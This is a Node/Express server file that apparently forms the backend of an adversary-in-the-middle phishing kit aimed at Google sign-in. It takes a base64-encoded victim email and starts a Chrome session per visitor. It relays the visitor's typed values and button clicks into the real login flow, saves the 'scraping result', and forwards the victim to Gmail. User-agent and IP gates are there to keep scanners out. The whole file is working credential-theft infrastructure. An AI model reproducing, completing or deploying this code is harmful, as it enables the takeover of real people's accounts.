// app.js — Express port of your Flask server
// ------------------------------------------

import fs from "fs";
import path from "path";
import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import cookieParser from "cookie-parser";
import axios from "axios";
import session from "express-session";
import bcrypt from "bcryptjs";
import { usersRouter } from './routes/users.js'

import {
  checkEmailAlreadySignin,
  checkEmailAlreayRunning,
  getUserId,
  initRendering,
  runChromeProcess,
  UsersDB,
} from "./helpers/utils.js";

import {
  scrapingReady,
  scrapInputValueAndBtnNext,
  scrapCheckURL,
  saveScrapingResultAndSetDone,
} from "./helpers/chrome.js";
import { decodeB64, writeDebugLogLine } from "./helpers/logger.js";
import {
  checkAgentValidation,
  checkClientIpValidation,
} from "./helpers/security.js";
import { STATUS_RUNNING } from "./db/jsonDB.js";
import { getHtmlAlreadySignIn } from "./helpers/html.js";

// Import centralized constants and error handling
import { APP_CONFIG, GOOGLE_URLS } from "./constants/index.js";
import { errorMiddleware, asyncHandler, AuthenticationError, NotFoundError } from "./helpers/errorHandler.js";

dotenv.config();

// ---------------------------
// Configuration
// ---------------------------
const app = express();
const PORT = Number(process.env.APP_PORT || APP_CONFIG.DEFAULT_PORT);

// ---------------------------
// Middleware Configuration
// ---------------------------
app.use(express.json());
app.use(express.raw({ type: "application/x-protobuffer" }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(cors());
app.use(express.static('public'));

// Session configuration
app.use(session({
  secret: process.env.SESSION_SECRET || APP_CONFIG.DEFAULT_SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { secure: false, maxAge: APP_CONFIG.SESSION_MAX_AGE }
}));

// Trust proxy for accurate IP detection
app.set("trust proxy", true);

// Template engine
app.set('view engine', 'ejs');
app.set('views', './views');


initRendering();

// ---------------------------
// Helper Functions
// ---------------------------
function extractClientInfo(req) {
  const userAgent = req.headers["user-agent"] || "";
  const clientIp =
    req.headers["http_client_ip"] ||
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.ip ||
    req.socket?.remoteAddress ||
    "";
  
  return { userAgent, clientIp };
}

function isLocalhost(clientIp) {
  return APP_CONFIG.LOCALHOST_IPS.includes(clientIp);
}

// ---------------------------
// Middleware
// ---------------------------
app.use(async (req, res, next) => {
  const { userAgent, clientIp } = extractClientInfo(req);

  // Security gate checks
  if (!checkAgentValidation(userAgent) || !checkClientIpValidation(clientIp)) {
    writeDebugLogLine(`[*** BLOCKED ***] ${clientIp} ${userAgent}`);
    return res.status(403).end();
  }
  
  req.clientIp = clientIp;
  req.userAgent = userAgent;
  next();
});
// ---------------------------
// Route Handlers
// ---------------------------
async function handleSignRequest(req, res) {
  const { clientIp, userAgent, originalUrl } = req;
  
  try {
    writeDebugLogLine(`[REQ] ${clientIp}  ${originalUrl}  ${userAgent}`);
    
    const payload = {
      userAgent: userAgent,
      clientIp: clientIp,
      params: req.query || {},
    };
    
    const backendRes = await axios.post(
      `http://localhost:${PORT}/api/sign`,
      payload
    );
    
    return res.status(backendRes.status || 200).send(backendRes.data);
  } catch (err) {
    writeDebugLogLine(
      `[ERROR] ${clientIp}  ${originalUrl}  ${String(
        (err && err.message) || err
      )}`
    );
    return res.status(502).send("Bad Gateway");
  }
}

async function handleApiSign(req, res) {
  try {
    // Security check for localhost only
    if (!isLocalhost(req.clientIp)) {
      writeDebugLogLine(`******** [DANGER IP] : ${req.clientIp} ********`);
      throw new NotFoundError("Page Not Found");
    }
    
    const reqBody = req.body || {};
    const { userAgent, clientIp, params } = reqBody;
    const { hl, acc, forward } = params;
    
    const email = decodeB64(acc, "");
    const lang = hl;
    const forwardURL = decodeB64(forward, GOOGLE_URLS.MAIL_DEFAULT);

    // Check if already signed in
    const chkFlg = await checkEmailAlreadySignin(email);
    if (chkFlg) {
      console.log("[ALREADY SIGNED IN] :", email);
      const signInHtml = getHtmlAlreadySignIn(forwardURL);
      return res.status(200).send(signInHtml || "");
    }

    // Check if already running
    const tmpUserId = await checkEmailAlreayRunning(email);
    
    if (!tmpUserId || Number(tmpUserId) < 0) {
      // New user - create new session
      const userId = await getUserId({
        clientIp,
        userAgent,
      });
      
      console.log("[NEW USER ID] :", userId, email, lang, forwardURL);
      
      const chromePid = await runChromeProcess(userId);
      await UsersDB.set(userId, {
        userId,
        email,
        lang,
        userAgent,
        pid: chromePid,
        status: STATUS_RUNNING,
        forwardURL,
      });

      const htmlTxt = await scrapingReady(userId, email, lang, {
        forwardURL,
        userAgent,
        newUserFlg: true,
      });
      
      return res.status(200).send(htmlTxt || "");
    } else {
      // Reuse existing user session
      console.log("[OLD USERID]", tmpUserId, email);
      const htmlTxt = await scrapingReady(tmpUserId, email, lang, {
        forwardURL,
        userAgent,
        newUserFlg: false,
      });
      
      return res.status(200).send(htmlTxt || "");
    }
  } catch (err) {
    console.error("[/information/session/sign] error:", err);
    return res.status(500).json({ status: 0, error: "internal_error" });
  }
}

function handleApiTest(req, res) {
  console.log("[API TESTING]");
  return res.status(200).json({
    msg: `API server is running on port : ${PORT}`,
    status: 200,
  });
}

async function handleBtnClick(req, res) {
  try {
    const payload = req.body || {};
    const { uid: userId, value: inputValue, btnType, btnText, btnTextAlt } = payload;

    const out = await scrapInputValueAndBtnNext(
      userId,
      inputValue,
      btnType,
      btnText,
      btnTextAlt
    );
    
    return res.json(out || {});
  } catch (err) {
    console.error("[/api/btn-click] error:", err);
    return res.status(500).json({ status: 0, error: "internal_error" });
  }
}

async function handleUrlCheck(req, res) {
  try {
    const payload = req.body || {};
    const { uid: userId } = payload;
    
    const out = await scrapCheckURL(userId);
    return res.json(out || {});
  } catch (err) {
    console.error("[/api/url-check] error:", err);
    return res.status(500).json({ status: 0, error: "internal_error" });
  }
}

async function handleDoneUser(req, res) {
  try {
    const payload = req.body || {};
    const { uid: userId } = payload;
    
    await saveScrapingResultAndSetDone(userId);
    console.log("[DONE USER]", userId);
    return res.json({ status: 1 });
  } catch (err) {
    console.error("[/api/done-user] error:", err);
    return res.status(500).json({ status: 0, error: "internal_error" });
  }
}

// ---------------------------
// Routes
// ---------------------------
app.use('/user-manager', usersRouter);
app.get("/information/session/sign", asyncHandler(handleSignRequest));
app.get("/api/test", handleApiTest);
app.post("/api/sign", asyncHandler(handleApiSign));
app.all("/api/btn-click", asyncHandler(handleBtnClick));
app.all("/api/url-check", asyncHandler(handleUrlCheck));
app.all("/api/done-user", asyncHandler(handleDoneUser));

// robots.txt handler
app.use(express.static(path.join(process.cwd(), "public")));
app.get("/robots.txt", (req, res) => {
  const p = path.join(process.cwd(), "public", "robots.txt");
  if (fs.existsSync(p)) return res.sendFile(p);
  return res.status(404).send("Not found");
});

// 404 handler
app.get("*", (req, res) => {
  const { clientIp, userAgent } = req;
  writeDebugLogLine(`[Wrong Request] ${clientIp}  ${req.url}  ${userAgent}`);
  throw new NotFoundError("Route not found");
});

// Error handling middleware (must be last)
app.use(errorMiddleware);

// Start server
app.listen(PORT, function () {
  console.log(`App is listening on port ${PORT}!`);
});
